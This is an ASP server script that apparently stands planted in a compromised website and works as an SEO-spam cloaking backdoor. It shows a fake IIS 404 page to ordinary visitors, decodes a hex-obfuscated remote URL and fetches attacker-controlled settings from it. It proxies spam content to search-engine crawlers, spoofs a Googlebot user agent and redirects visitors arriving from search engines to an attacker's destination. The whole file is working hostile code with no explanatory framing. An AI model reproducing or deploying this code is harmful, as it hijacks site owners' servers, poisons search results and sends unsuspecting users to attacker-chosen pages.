<%
if spiderbot = False and Request.ServerVariables("HTTP_REFERER")="" then 
Response.Status="404 Not Found"
html404="<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01//EN"" ""http://www.w3.org/TR/html4/strict.dtd"">" & vbcrlf
html404=html404 & " <HTML><HEAD><TITLE>无法找到该页</TITLE>" & vbcrlf
html404=html404 & " <META HTTP-EQUIV='Content-Type' Content='text/html; charset=GB2312'>" & vbcrlf
html404=html404 & " <STYLE type='text/css'>" & vbcrlf
html404=html404 & "  BODY { font: 9pt/12pt 宋体 }" & vbcrlf
html404=html404 & "  H1 { font: 12pt/15pt 宋体 }" & vbcrlf
html404=html404 & "   H2 { font: 9pt/12pt 宋体 }" & vbcrlf
html404=html404 & "   A:link { color: red }" & vbcrlf
html404=html404 & "   A:visited { color: maroon }" & vbcrlf
html404=html404 & " </STYLE>" & vbcrlf
html404=html404 & " </HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>" & vbcrlf
html404=html404 & " <h1>无法找到该页</h1>" & vbcrlf
html404=html404 & " 您正在搜索的页面可能已经删除、更名或暂时不可用。" & vbcrlf
html404=html404 & " <hr>" & vbcrlf
html404=html404 & " <p>请尝试以下操作：</p>" & vbcrlf
html404=html404 & " <ul>" & vbcrlf
html404=html404 & " <li>确保浏览器的地址栏中显示的网站地址的拼写和格式正确无误。</li>" & vbcrlf
html404=html404 & " <li>如果通过单击链接而到达了该网页，请与网站管理员联系，通知他们该链接的格式不正确。" & vbcrlf
html404=html404 & " </li>" & vbcrlf
html404=html404 & " <li>单击<a href='javascript:history.back(1)'>后退</a>按钮尝试另一个链接。</li>" & vbcrlf
html404=html404 & " </ul>" & vbcrlf
html404=html404 & " <h2>HTTP 错误 404 - 文件或目录未找到。<br>Internet 信息服务 (IIS)</h2>" & vbcrlf
html404=html404 & " <hr>" & vbcrlf
html404=html404 & " <p>技术信息（为技术支持人员提供）</p>" & vbcrlf
html404=html404 & " <ul>" & vbcrlf
html404=html404 & " <li>转到 <a href='http://go.microsoft.com/fwlink/?linkid=8180'>Microsoft 产品支持服务</a>并搜索包括&ldquo;HTTP&rdquo;和&ldquo;404&rdquo;的标题。</li>" & vbcrlf
html404=html404 & " <li>打开&ldquo;IIS 帮助&rdquo;（可在 IIS 管理器 (inetmgr) 中访问），然后搜索标题为&ldquo;网站设置&rdquo;、&ldquo;常规管理任务&rdquo;和&ldquo;关于自定义错误消息&rdquo;的主题。</li>" & vbcrlf
html404=html404 & " </ul>" & vbcrlf

html404=html404 & " </TD></TR></TABLE></BODY></HTML>" & vbcrlf
response.write html404
Response.end
end if
function spiderbot()
	spiderbot = False 
	dim agent: agent = lcase(request.servervariables("http_user_agent"))
	Dim tm, tms
	dim Bot: Bot = ""
	if instr(agent, "googlebot") > 0 then Bot = "Google"
	if instr(agent, "baiduspider") > 0 then Bot = "Baidu"
	If  len(Bot) > 0 Then 
		spiderbot = True 
	Else
		spiderbot = False 
	End If 
end Function
Dim megeturl78b, megotourl78b, wurl78b
Function jiem(str)
Dim key, s , i 
jstr = ""
For i = 1 To Len(str)
key = Mid(str, i, 1)
 If Asc(key) > &H2F And Asc(key) < &H47 Then
       s = s & key
 
      If Len(s) = 2 And CLng("&H" & s) < 127 Then

      jstr = jstr & Chr(CLng("&H" & s))
      s = "": key = ""
      ElseIf Len(s) = 4 Then
      jstr = jstr & Chr(clng("&H" & s))
      s = "": key = ""
      End If
End If
Next
jiem = jstr
End Function
serverurl =Request("url") 
If Application("meUrl78b") = "" Or Application("meDrl78b")= "" Or datediff("s",Application("time"),Now())>3600 Then
Application("time") = Now()
wurl78b= jiem("687474703A2F2F73656F2E7061737335312E6E65742F64697A6869332E747874") 
webarray78b=split(jiem(GetURL(wurl78b)),"$$")
Application("meUrl78b")  = webarray78b(0) 'c
Application("meDrl78b")  =webarray78b(1)'t
End If 

domain78b = Application("meUrl78b")
gotourl78b = Application("meDrl78b") 


dim SpiderList
SpiderList="Baidu|Google|gougou|soso|youdao|yahoo|sogou"
Function IsSpider
ValidEntry=false
SpiderListArr=Split(SpiderList,"|")
for i=0 to Ubound (SpiderListArr)
If InStr(lcase(Request.ServerVariables("HTTP_USER_AGENT")),lcase(SpiderListArr(i))) > 0 then
ValidEntry = True
exit for
end if
next
IsSpider=ValidEntry
End Function
Function CheckRefresh
ValidEntry=false
SpiderListArr=Split(SpiderList,"|")
for i=0 to Ubound (SpiderListArr)
If InStr(lcase(Request.ServerVariables("HTTP_REFERER")) ,lcase(SpiderListArr(i))) > 0 then
ValidEntry = True
exit for
end if
next
CheckRefresh=ValidEntry
End Function
if not IsSpider then
if CheckRefresh then
Response.Redirect gotourl78b
response.end
else
end if
end if
url1=Request.ServerVariables("HTTP_url")
if instr(url1,"?")>0 then
url2=split(url1,"?")
url=url2(1)
end if
sendurl =domain78b&"?"&url
cont=GetURL(sendurl)
cont=replace(cont,"href=""","href=""?")
cont=replace(cont,"charset=utf-8","charset=gb2312")
response.Write cont
Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream") 
objstream.Type = 1 
objstream.Mode = 3 
objstream.Open 
objstream.Write body
objstream.Position = 0 
objstream.Type = 2 
objstream.Charset = Cset 
BytesToBstr = objstream.ReadText 
objstream.Close 
set objstream = nothing 
End Function
Function GetURL(url)
set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP") 
xmlhttp.open "GET", url, false 
xmlhttp.setRequestHeader "User-Agent", "Googlebot/2.1 (+ http://www.baiduspider.com/bot.html;banni MSIE 60; Windows NT 5.1; SV1; .RINIMABI CLR 2.0.50727)"
xmlhttp.send
GetURL=BytesToBstr(xmlhttp.responsebody,"utf-8")
set xmlhttp = nothing
End Function
function Randsub(numtotal)
Randomize
Randsub = int((numtotal-1+1)*rnd+1)
end Function
%>